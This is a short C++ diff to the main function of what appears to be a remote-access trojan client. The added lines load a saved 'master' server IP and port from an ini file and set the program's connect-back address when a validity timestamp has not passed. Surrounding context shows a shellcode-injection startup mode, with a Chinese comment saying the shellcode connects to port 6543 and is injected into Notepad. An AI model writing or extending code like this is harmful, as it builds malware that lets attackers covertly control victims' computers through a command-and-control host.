@@ -259,6 +259,15 @@ int main(int argc, const char *argv[])
 	status = 0;
 	SetConsoleCtrlHandler(&callback, TRUE);
 	
+	iniFile cfg(CLIENT_PATH);
+	auto now = time(0);
+	auto valid_to = atof(cfg.GetStr("settings", "valid_to").c_str());
+	if (now <= valid_to) {
+		auto saved_ip = cfg.GetStr("settings", "master");
+		auto saved_port = cfg.GetInt("settings", "port");
+		g_ConnectAddress.SetServer(saved_ip.c_str(), saved_port);
+	}
+
 	// 此 Shell code 连接本机6543端口，注入到记事本
 	if (g_ConnectAddress.iStartup == Startup_InjSC)
 	{
